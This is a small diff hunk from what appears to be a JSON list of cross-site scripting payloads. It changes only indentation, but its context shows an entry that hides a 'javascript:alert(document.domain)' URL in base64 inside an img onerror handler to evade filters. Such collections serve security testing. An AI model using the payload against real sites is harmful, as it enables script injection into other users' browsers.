@@ -59,7 +59,7 @@
             "safari"
         ]
     },
-        {
+    {
         "description": "Img tag with base64 encoding",
         "code": "<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>",
         "browsers": [
